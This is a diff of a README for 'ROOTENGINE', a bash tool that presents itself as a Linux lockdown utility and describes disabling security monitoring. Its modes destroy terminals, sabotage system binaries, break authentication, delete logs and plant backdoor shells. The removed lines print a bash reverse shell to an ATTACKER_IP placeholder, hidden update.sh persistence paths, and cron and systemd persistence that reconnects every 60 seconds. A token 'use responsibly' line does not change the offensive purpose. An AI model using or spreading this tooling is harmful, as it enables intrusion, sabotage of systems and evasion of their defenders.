@@ -2,10 +2,6 @@
 
 Advanced Linux system lockdown tool with security monitoring neutralization capabilities.
 
-**Author:** @rafok2v9c
-
----
-
 ## Example Session
 
 ```bash
@@ -73,11 +69,11 @@ ROOTENGINE neutralizes security monitoring solutions while maintaining web servi
 
 * Ubuntu, Debian, Fedora, Linux Mint
 * Arch Linux, Manjaro, openSUSE
-* Pop!_OS, Kali Linux, AlmaLinux
+* Pop!_OS, Kali Linux, AlmaLinux and other Debian based OS
 
 ### Requirements
 
-* Root/sudo access
+* root/sudo access
 * Bash 4.0+
 
 ---
@@ -97,10 +93,8 @@ chmod +x rootengine.sh
 ### Basic Usage
 
 ```bash
-# Show help
 sudo ./rootengine.sh --help
-
-# Run interactive mode
+or
 sudo ./rootengine.sh
 ```
 
@@ -108,7 +102,7 @@ sudo ./rootengine.sh
 
 ## Operating Modes
 
-### Mode 1: Aggressive (Maximum Lockdown)
+### Mode 1: Aggressive
 
 Complete system lockdown with maximum restrictions.
 
@@ -118,35 +112,21 @@ Complete system lockdown with maximum restrictions.
 * Terminals destroyed
 * System binaries sabotaged
 * Authentication broken
-* Display backlight disabled
 * Web services protected and running
 
 **Result:** System totally locked, only web accessible from outside.
 
 ---
 
-### Mode 2: Backdoor (Attacker Access)
+### Mode 2: Backdoor
 
 System lockdown while maintaining backdoor access.
 
 **What happens:**
 * Security monitoring neutralized
-* Admin access blocked (for legitimate users)
-* Logs encrypted/deleted
+* Server Admin access blocked
+* Logs deleted
 * Web services protected
 * Backdoor shells established
-
-**Backdoor Details:**
-* Bash reverse shell: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
-* Hidden locations:
-  * `/.cache/.system/update.sh`
-  * `/var/tmp/.x11/update.sh`
-  * `/dev/shm/.config/update.sh`
-* Persistence: Crontab + Systemd + @reboot
-* Auto-reconnect every 60 seconds
-
-**Configuration:**
-* Provide attacker IP address
-* Provide listening port
 
 **Use responsibly and legally.**
